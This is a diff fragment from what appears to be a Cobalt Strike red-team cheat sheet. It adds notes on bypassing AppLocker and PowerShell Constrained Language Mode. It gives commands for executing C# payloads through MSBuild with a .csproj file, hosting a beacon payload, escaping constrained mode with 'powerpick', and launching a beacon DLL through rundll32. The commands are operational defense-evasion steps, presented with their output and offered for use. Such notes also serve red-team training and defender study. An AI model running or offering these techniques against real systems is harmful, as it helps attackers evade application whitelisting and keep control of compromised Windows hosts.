@@ -25,3 +25,19 @@
 
     beacon> powershell Get-Acl C:\Windows\Tasks | fl
 
+LOLBAS
+# Use MSBuild to execute C# code from a .csproj or .xml file
+# Host http_x64.xprocess.bin via Site Management > Host File
+# Start execution using C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe applocker_bypass.csproj
+
+# break out of PowerShell Constrained Language Mode by using an unmanaged PowerShell runspace
+
+    beacon> powershell $ExecutionContext.SessionState.LanguageMode
+    ConstrainedLanguage
+
+    beacon> powerpick $ExecutionContext.SessionState.LanguageMode
+    FullLanguage
+
+# Beacon DLL (DLLs are usually not restricted by Applocker due to performance reason)
+
+    C:\Windows\System32\rundll32.exe http_x64.dll,StartW
